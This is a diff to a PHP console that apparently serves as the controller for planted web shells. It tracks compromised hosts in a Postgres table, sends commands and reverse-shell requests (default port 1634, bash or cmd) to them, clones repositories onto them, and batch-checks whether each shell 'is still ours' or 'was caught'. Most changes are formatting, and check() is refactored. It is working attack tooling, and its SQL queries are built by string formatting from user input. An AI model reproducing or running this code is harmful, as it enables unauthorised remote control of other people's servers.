@@ -90,7 +90,7 @@ function logo($last, $cl, bool $error, $error_value, string $lastHost)
         echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
         echo("\033[33;40m                                                                                    \033[0m\n");
         echo("\033[33;40m  Last command: $last                                                               \033[0m\n");
-        print(sprintf("\033[33;40m  Last Host -> %s",$lastHost)."\033[0m\n");
+        print(sprintf("\033[33;40m  Last Host -> %s", $lastHost) . "\033[0m\n");
         if ($error === true && !empty($error_value)) {
             if (is_array($error_value)) {
                 echo("\033[33;40m  What was the error:                                                           \033[0m\n");
@@ -152,7 +152,7 @@ function sys($host)
     if (!empty($host)) {
         $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
         $axX = pg_fetch_row($tc);
-        curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1]."?qs=cqBS");
+        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1] . "?qs=cqBS");
         curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
@@ -181,24 +181,24 @@ function rev($host, $port, $method)
     if (isset($host)) {
         $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri,os_flavor FROM sloppy_bots_main WHERE id = '%s'", $host));
         $axX = pg_fetch_row($tc);
-        if (empty($port)){
+        if (empty($port)) {
             $usePort = "1634";
-        }else{
+        } else {
             $usePort = $port;
         }
-        if (empty($method)){
+        if (empty($method)) {
             $useMethod = "bash";
-        }else{
+        } else {
             $useMethod = $method;
         }
-        if (empty($useShell) && $axX[2] == "lin"){
+        if (empty($useShell) && $axX[2] == "lin") {
             $useShell = "bash";
-        }else{
+        } else {
             $useShell = "cmd";
         }
         echo "[ ++ ] Trying: " . $axX[0] . " on " . $usePort . "[ ++ ]\n";
-        $revCommand = base64_encode($useMethod.".".$usePort.".".$useShell);
-        curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1]);
+        $revCommand = base64_encode($useMethod . "." . $usePort . "." . $useShell);
+        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
         curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
@@ -247,7 +247,7 @@ function co($command, $host, bool $encrypt)
     if (!empty($host) && !is_null($space_Safe_coms) && !is_null($cr)) {
         $tcO = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
         $axX = pg_fetch_row($tcO);
-        curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1]);
+        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
         curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
@@ -282,7 +282,7 @@ function clo($host, $repo, $uri)
     if (!empty($host) && !empty($repo) && !empty($uri)) {
         $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
         $axX = pg_fetch_row($tc);
-        curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1]);
+        curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1]);
         curl_setopt(CHH, CURLOPT_TIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 15);
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
@@ -376,16 +376,14 @@ function aHo($host, $os, $checkIn)
     $t = new postgres_checker();
     if (!empty($host)) {
         $path = parse_url($host);
-        if ($t->insertRecord($path['scheme'] . "://" . $path['host'] . ":" . $path['port'], $path['path'], $os, $checkIn, $uuid='', $action='add') != 0) {
+        if ($t->insertRecord($path['scheme'] . "://" . $path['host'] . ":" . $path['port'], $path['path'], $os, $checkIn, $uuid = '', $action = 'add') != 0) {
             echo "Successfully added: $host";
         } else {
             echo "There was an error. Double checking the database.";
             if (!$t->checkDB()) {
                 echo "There is a sevre error in the db, you need to ensure you have it crated.";
                 echo "Attempting to re-create or create the DB.";
-                if ($t->createDB()) {
-                    echo "Created the db successfully! Please re run this command to insert the new host.";
-                }
+                $t->createDB();
             } else {
                 echo "Seems as though the information supplied, was bad..\nOr the host already is in the DB.";
                 $t->getRecord($host);
@@ -420,65 +418,58 @@ function awesomeMenu()
 function check($host, $path, $batch)
 {
     $curlHandle = CHH;
-    if (!empty($batch)) {
-        switch ($batch) {
-            case "y":
-                $c = pg_exec(pg_connect(DBCONN), "SELECT rhost,uri FROM sloppy_bots_main WHERE NOT NULL");
-                $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
-                echo "Pulling: " . pg_fetch_row($count) . "\nThis could take awhile.";
-                curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
-                curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
-                curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
-                foreach (pg_fetch_all($c) as $r => $bH) {
-                    if (!empty($r)) {
-                        curl_setopt(CHH, CURLOPT_URL, $bH[0]."/".$bH[1]."?qs=cqS");
-                        curl_exec(CHH);
-                        if (!curl_errno(CHH)) {
-                            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
-                                case 200:
-                                    echo "Host is still ours!\n";
-                                    break;
-                                case 404:
-                                    echo "Looks like our shell was caught... sorry..\n";
-                                    break;
-                                case 500:
-                                    echo "Your useragent was not the correct one... did you forget??\n";
-                                    break;
-                                default:
-                                    echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
-                                    break;
-                            }
-                        }
-
-                    }
+    if ($batch === "y") {
+        $c = pg_exec(pg_connect(DBCONN), "SELECT rhost,uri FROM sloppy_bots_main WHERE rhost IS NOT NULL");
+        $count = pg_exec(pg_connect(DBCONN), 'SELECT COUNT(*) FROM (SELECT rhost from sloppy_bots_main WHERE rhost IS NOT NULL) AS TEMP');
+        $rows = pg_fetch_all($c);
+        echo "Pulling: " . pg_fetch_result($count, null, null) . "\nThis could take awhile.";
+        curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
+        curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
+        curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
+        foreach ($rows as $r) {
+            echo "\nTrying: {$r['rhost']}{$r['uri']}\n";
+            curl_setopt(CHH, CURLOPT_URL, $r['rhost'] . $r['uri'] . "?qs=cqS");
+            curl_exec(CHH);
+            switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
+                case 200:
+                    echo "{$r['rhost']}{$r['uri']} is still ours!\n";
+                    break;
+                case 404:
+                    echo "{$r['rhost']}{$r['uri']}\nLooks like our shell was caught... sorry..\n";
+                    break;
+                case 500:
+                    echo "{$r['rhost']}{$r['uri']}\nYour useragent was not the correct one... did you forget??\n";
+                    break;
+                default:
+                    echo "Hmm. A status other than what i was looking for was returned on {$r['rhost']}{$r['uri']}, please manually confirm the shell was uploaded.\n";
+                    break;
+            }
+        }
+    } elseif ($batch === "n") {
+        if (!empty($host) && !empty($path)) {
+            $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
+            $axX = pg_fetch_row($tc);
+            curl_setopt(CHH, CURLOPT_URL, $axX[0] . $axX[1] . "?qs=cqS");
+            curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
+            curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
+            curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
+            curl_exec(CHH);
+            if (!curl_errno(CHH)) {
+                switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
+                    case 200:
+                        echo $axX[0] . $axX[1] . " is still ours!\n";
+                        break;
+                    case 404:
+                        echo $axX[0] . $axX[1] . "\nLooks like our shell was caught... sorry..\n";
+                        break;
+                    case 500:
+                        echo $axX[0] . $axX[1] . "\nYour useragent was not the correct one... did you forget??\n";
+                        break;
+                    default:
+                        echo $axX[0] . $axX[1] . "\nHmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
+                        break;
                 }
-                break;
-            case "n":
-                if (!empty($host) && !empty($path)) {
-                    $tc = pg_exec(pg_connect(DBCONN), sprintf("SELECT rhost,uri FROM sloppy_bots_main WHERE id = '%s'", $host));
-                    $axX = pg_fetch_row($tc);
-                    curl_setopt(CHH, CURLOPT_URL, $axX[0].$axX[1] ."?qs=cqS");
-                    curl_setopt(CHH, CURLOPT_TIMEOUT, 5);
-                    curl_setopt(CHH, CURLOPT_CONNECTTIMEOUT, 5);
-                    curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
-                    curl_exec(CHH);
-                    if (!curl_errno(CHH)) {
-                        switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
-                            case 200:
-                                echo "Host is still ours!\n";
-                                break;
-                            case 404:
-                                echo "Looks like our shell was caught... sorry..\n";
-                                break;
-                            case 500:
-                                echo "Your useragent was not the correct one... did you forget??\n";
-                                break;
-                            default:
-                                echo "Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\n";
-                                break;
-                        }
-                    }
-                }
+            }
         }
     } else {
         logo("cr", "", true, "", $host);
@@ -637,7 +628,7 @@ while ($run) {
             break;
         case "ch":
             system(clears);
-            try{
+            try {
                 $b = strtolower(readline("Is this going to be a batch job?(Y/N)\n->"));
                 switch ($b) {
                     case "y":
@@ -646,6 +637,7 @@ while ($run) {
                         break;
                     case "n":
                         echo "Not executing batch job.\n";
+                        awesomeMenu();
                         $h = readline("Who is it we need to check on?(based on ID)\n->");
                         check($h, "chR", "n");
                         break;
